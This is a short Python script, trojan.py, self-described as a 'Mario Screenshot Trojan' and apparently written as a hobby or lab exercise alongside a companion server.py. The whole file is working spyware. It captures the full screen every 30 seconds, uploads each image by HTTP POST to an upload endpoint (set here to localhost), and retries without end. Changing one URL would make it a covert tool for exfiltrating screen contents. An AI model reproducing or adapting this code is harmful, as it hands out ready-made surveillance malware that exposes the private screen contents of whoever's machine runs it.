# trojan.py - UPDATED
import time
import requests
import mss
import io
from PIL import Image
import os

# Get the same folder as server.py
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SERVER_URL = "http://localhost:5000/upload"  # Local server
MONITOR_INDEX = 1
INTERVAL = 30

def take_and_send_screenshot():
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[MONITOR_INDEX]
            screenshot = sct.grab(monitor)
            
            img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
            buffer = io.BytesIO()
            img.save(buffer, format='PNG')
            buffer.seek(0)
            
            files = {'file': ('mario_screenshot.png', buffer, 'image/png')}
            print(f"📤 Uploading to {SERVER_URL}...")
            
            response = requests.post(SERVER_URL, files=files, timeout=15)
            
            if response.status_code == 200:
                print(f"✅ Upload successful: {response.json().get('message', 'OK')}")
                return True
            else:
                print(f"❌ Upload failed: {response.status_code}")
                print(f"Response: {response.text}")
                return False
                
    except requests.exceptions.ConnectionError:
        print("❌ Cannot connect to server. Make sure server.py is running!")
        return False
    except Exception as e:
        print(f"❌ Error: {e}")
        return False

def run_trojan_loop():
    print("🎮 Mario Screenshot Trojan Started")
    print(f"⏱️  Interval: {INTERVAL} seconds")
    print("=" * 50)
    
    count = 0
    while True:
        count += 1
        print(f"\n📸 Attempt #{count}")
        
        if take_and_send_screenshot():
            print(f"✅ Total successful: {count}")
        else:
            print("🔄 Will retry...")
        
        time.sleep(INTERVAL)

if __name__ == "__main__":
    # Test connection first
    try:
        print("🔗 Testing server connection...")
        test = requests.get("http://localhost:5000", timeout=5)
        print("✅ Server is reachable!")
        run_trojan_loop()
    except:
        print("❌ Server not found. Start server.py first!")
        print("Trying anyway in 5 seconds...")
        time.sleep(5)
        run_trojan_loop()